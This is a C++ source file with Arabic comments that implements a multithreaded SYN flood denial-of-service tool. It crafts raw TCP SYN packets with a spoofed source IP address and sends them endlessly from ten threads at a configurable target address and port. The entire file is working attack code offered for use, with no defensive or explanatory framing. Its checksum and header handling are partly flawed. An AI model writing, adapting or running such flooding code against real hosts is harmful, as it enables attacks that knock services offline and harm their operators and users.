#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>

using namespace std;

// تحديد الهدف
const char *target_ip = "192.168.1.1";  // تغيير عنوان الـ IP هنا
const int target_port = 80;             // تغيير المنفذ هنا

// دالة لحساب الـ checksum
unsigned short checksum(void *b, int len) {    
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// دالة SYN Flood
void *syn_flood(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    struct sockaddr_in dest;
    struct iphdr iph;
    struct tcphdr tcph;
    char packet[4096];

    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = inet_addr(target_ip);

    memset(packet, 0, 4096);  // ملء الحزمة بالصفر

    // إعداد رأس IP
    iph.ihl = 5;  // طول رأس IP
    iph.version = 4;  // إصدار بروتوكول IP
    iph.tos = 0;  // نوع الخدمة
    iph.id = htonl(rand());  // تعريف المعرف العشوائي
    iph.frag_off = 0;  // تحديد شريحة البيانات
    iph.ttl = 255;  // مدة حياة الحزمة
    iph.protocol = IPPROTO_TCP;  // البروتوكول
    iph.saddr = inet_addr("192.168.1.2");  // عنوان المصدر (يمكن تغييره)
    iph.daddr = dest.sin_addr.s_addr;  // عنوان الوجهة

    iph.check = checksum(&iph, sizeof(struct iphdr));  // حساب الـ checksum للرأس IP

    // إعداد رأس TCP
    tcph.source = htons(rand() % 65535);  // منفذ المصدر العشوائي
    tcph.dest = htons(target_port);  // منفذ الوجهة
    tcph.seq = 0;  // تسلسل البيانات
    tcph.ack_seq = 0;  // تسلسل الاستجابة
    tcph.doff = 5;  // طول رأس TCP
    tcph.fin = 0;  // تحديد ما إذا كان الـ FIN مفعلاً
    tcph.syn = 1;  // تحديد ما إذا كان الـ SYN مفعلاً
    tcph.rst = 0;  // تحديد ما إذا كان الـ RST مفعلاً
    tcph.psh = 0;  // تحديد ما إذا كان الـ PSH مفعلاً
    tcph.ack = 0;  // تحديد ما إذا كان الـ ACK مفعلاً
    tcph.urg = 0;  // تحديد ما إذا كان الـ URG مفعلاً
    tcph.window = htons(5840); /* حجم نافذة TCP */
    tcph.check = checksum(&tcph, sizeof(struct tcphdr));  // حساب الـ checksum لرأس TCP

    // دمج رأس الـ IP ورأس الـ TCP في الحزمة
    memcpy(packet, &iph, sizeof(struct iphdr));
    memcpy(packet + sizeof(struct iphdr), &tcph, sizeof(struct tcphdr));

    // إرسال الحزمة
    while (true) {
        if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("Send failed");
        }
    }

    close(sock);
    return NULL;
}

int main() {
    pthread_t thread_id;

    // إطلاق خيط للهجوم
    for (int i = 0; i < 10; i++) {
        pthread_create(&thread_id, NULL, syn_flood, NULL);
    }

    // الانتظار إلى أن ينتهي الهجوم
    while (true) {
        sleep(1);
    }

    return 0;
}